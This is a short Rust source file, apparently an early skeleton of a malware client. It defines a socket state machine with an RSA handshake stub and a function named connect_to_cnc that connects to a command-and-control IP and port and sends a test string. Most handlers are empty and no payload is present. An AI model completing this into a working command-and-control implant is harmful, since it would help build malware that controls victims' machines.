use tokio::net::TcpStream;
use tokio::io::{AsyncWriteExt};
pub enum SocketState {
    Handshake(HandshakeState),
    Operational
}

pub enum HandshakeState {
    ServerHello, // RSA public key
}

pub struct SocketStream {
    pub stream: TcpStream,
    state: SocketState,
}

impl SocketStream {
    pub fn new(stream: TcpStream) -> Self {
        Self {
            stream,
            state: SocketState::Handshake(HandshakeState::ServerHello)
        }
    }

    pub async fn consume_message(&self) -> Result<(Vec<u8>, usize), std::io::Error> {
        let mut data = vec![0; 1024];

        match self.stream.try_read(&mut data) {
            Err(e) => return Err(e),
            Ok(n_bytes) => {
                if n_bytes == 0 {
                    return Ok((vec![0u8], 0));
                }
                
                Ok((data, n_bytes))
            },
        }
    }

    pub async fn handle_msg(&self, msg: Vec<u8>) {
        match &self.state { 
            SocketState::Handshake(handshake_state) => {
                match handshake_state {
                    ServerHello => {

                    },
                }
            },
            SocketState::Operational => {}
        }
    }
}
pub async fn connect_to_cnc(ip: &str, port: u16) -> Result<TcpStream, Box<dyn std::error::Error>> {
    let mut stream = TcpStream::connect(&format!("{}:{}", ip, port)).await?;

    stream.write_all(b"test").await?;
    Ok(stream)
}

pub async fn start_handshake() {
    
}